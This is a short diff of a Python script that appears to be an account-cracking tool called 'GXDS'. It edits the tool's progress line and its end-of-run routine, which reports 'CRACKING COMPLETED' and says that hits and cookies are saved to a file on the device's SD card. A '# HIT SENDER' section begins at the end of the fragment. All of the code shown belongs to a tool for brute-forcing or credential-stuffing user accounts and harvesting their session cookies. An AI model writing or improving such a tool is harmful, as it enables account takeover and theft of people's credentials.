@@ -654,7 +654,7 @@ def gxdsAPI(uid, pxss, tl):
     global oks, loop, cps, ugen
     session = requests.Session()
     sys.stdout.write(
-        f"\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s \r" % (loop, tl, len(cps), len(oks))
+        f"\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s" % (loop, tl, len(cps), len(oks))
     ),
     sys.stdout.flush()
     try:
@@ -733,8 +733,15 @@ def gxdsAPI(uid, pxss, tl):
         loop += 1
     except:
         pass
-        result(oks, cps)
-        exit()
+        if len(oks) != 0 or len(cps) != 0:
+          lxnes()
+        print(f"{lgr}  [✓] CRACKING COMPLETED")
+        print(f"{lgr}  [✓] HIT & COOKIES SAVED IN /SDCARD/GXDS.TXT")
+        print(f"{rc}  [+] TOTAL HITS: %s" % str(len(oks)))
+        print(f"{rc}  [+] TOTAL CP: %s" % str(len(cps)))
+        lxnes()
+        input(f"{dg}  [+] PRESS ENTER TO GO BACK")
+        mxnu()
 
 
 # HIT SENDER
